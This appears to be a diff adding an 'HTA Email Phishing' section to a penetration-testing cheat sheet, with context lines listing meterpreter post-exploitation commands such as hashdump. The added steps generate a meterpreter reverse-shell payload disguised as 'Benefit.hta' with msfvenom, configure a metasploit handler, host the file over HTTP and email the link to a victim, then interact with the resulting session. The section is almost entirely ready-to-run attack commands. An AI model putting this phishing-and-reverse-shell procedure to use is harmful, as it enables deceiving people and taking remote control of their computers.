@@ -105,3 +105,35 @@ webcam_stream: Plays a video stream from the specified webcam
 getsystem: Attempts to elevate your privilege to that of local system
 hashdump: Dumps the contents of the SAM database
 ```
+
+## HTA Email Phishing
+
+### Create the payload with msfvenom
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT=443 -f hta-psh -o Benefit.hta
+```
+
+### Set up metasploit
+
+- `msfconsole`
+- `use exploit/multi/handler`
+- `set payload windows/x64/meterpreter/reverse_tcp`
+- `set LHOST IP-OF-ATTACK-MACHINE`
+- `set LPORT 443`
+- `exploit -j`
+
+### Host the file
+
+- Launch this in the folder where the payload is `python3 -m http.server 80`
+
+### Send the phishing email
+
+- We can now send an email with a link to our reverse shell `http://IP-OF-ATTACK-MACHINE/name-of-your-script.hta`
+- When the phishing receptient will execute the file we will get a reverse shell
+
+### Catch your shell and interact
+
+- In your metasploit shell launch `sessions`
+- We should see a new meterpreter sessions from our taget machine
+- To interact with it we can do `sessions -i number-of-session`
